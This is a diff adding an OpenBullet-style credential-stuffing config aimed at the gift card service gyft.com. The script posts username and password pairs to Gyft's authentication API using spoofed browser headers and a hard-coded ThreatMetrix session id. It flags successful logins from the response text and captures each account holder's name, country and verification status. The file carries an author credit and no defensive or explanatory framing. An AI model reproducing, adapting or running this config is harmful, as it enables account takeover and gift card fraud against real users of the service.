@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "gyft.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-31T12:19:53.1267943+00:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#TIME FUNCTION CurrentUnixTime -> VAR "a" 
+
+#LOG REQUEST POST "https://clientapi.gyft.com/api/users/get_authentication_details" 
+  CONTENT "{\"email\":\"<USER>\",\"plain_text_password\":\"<PASS>\",\"fetch_profile\":true,\"y_timestamp\":<a>,\"threatmetrix_session_id\":\"c90862385f0cf4df6abeabcf54b277bf\",\"add_to_gyft_details\":{\"provider\":\"GYFT\",\"access_token\":null},\"user_session\":true}" 
+  CONTENTTYPE "application/json;charset=UTF-8" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 269" 
+  HEADER "Content-Type: application/json;charset=UTF-8" 
+  HEADER "Host: clientapi.gyft.com" 
+  HEADER "Origin: https://app.gyft.com" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"101\", \"Microsoft Edge\";v=\"101\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53" 
+
+#KEY KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":0,\"" 
+  KEYCHAIN Failure OR 
+    KEY "Oops, you entered an invalid email address and/or password" 
+    KEY "Unable to process request" 
+
+#first_name PARSE "<SOURCE>" JSON "first_name" CreateEmpty=FALSE -> CAP "first_name" 
+
+#last_name PARSE "<SOURCE>" JSON "last_name" CreateEmpty=FALSE -> CAP "last_name" 
+
+#country_code PARSE "<SOURCE>" JSON "country_code" CreateEmpty=FALSE -> CAP "country_code" 
+
+#is_validated_email PARSE "<SOURCE>" JSON "is_validated_email" CreateEmpty=FALSE -> CAP "is_validated_email" 
+
+#is_validated_mobile_number PARSE "<SOURCE>" JSON "is_validated_mobile_number" CreateEmpty=FALSE -> CAP "is_validated_mobile_number" 
+
+#@LOVER_WQ FUNCTION Constant "@LOVER_WQ" -> CAP "config by :" 
+
